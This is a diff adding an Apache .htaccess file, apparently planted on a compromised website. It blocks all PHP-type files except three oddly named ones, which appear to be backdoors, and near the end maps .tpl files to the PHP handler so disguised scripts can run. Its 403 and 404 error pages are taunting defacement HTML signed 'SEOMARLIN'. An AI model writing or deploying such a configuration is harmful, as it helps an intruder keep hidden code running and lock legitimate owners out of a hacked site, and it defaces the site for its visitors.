@@ -1,0 +1,37 @@
+Options -Indexes
+# Blokir file PHP dan script berbahaya
+<FilesMatch "(?i)\.(phtml|php|phar|php82|pgif|pht|phtm|shtml|inc|php[0-9]?|aspx?)$">
+Require all denied
+</FilesMatch>
+
+# IZINKAN gambar dan file publik
+<FilesMatch "\.(jpg|jpeg|png|gif|pdf|xml|txt|js|css|tpl|doc|docs|dxc)$">
+Require all granted
+</FilesMatch>
+
+# Izinkan file tertentu
+<FilesMatch '^(cores-OTH.php|EmaillValidatorTest.php|Dummy/DumyReason.php)$'>
+Require all granted
+</FilesMatch>
+
+# Blokir file tersembunyi
+<FilesMatch "^\.">
+Require all denied
+</FilesMatch>
+
+# Rewrite untuk aplikasi
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . index.php [L]
+</IfModule>
+
+# Error page
+ErrorDocument 403 '<center><img src="https://media1.tenor.com/m/-X0l3bF-IuEAAAAC/killer-bee-naruto.gif"><h3>DASAR PAYAH-DASAR LEMAH!! KURATAKAN BO KAU VATHAN</font><br><h2>by SEOMARLIN</h2>'
+ErrorDocument 404 '<center><img src="https://media1.tenor.com/m/-X0l3bF-IuEAAAAC/killer-bee-naruto.gif"><h3>DASAR PAYAH-DASAR LEMAH!! KURATAKAN BO KAU VATHAN</font><br><h2>by SEOMARLIN</h2>'
+
+# Tambahkan tipe PHP untuk .tpl
+AddType application/x-httpd-php .tpl
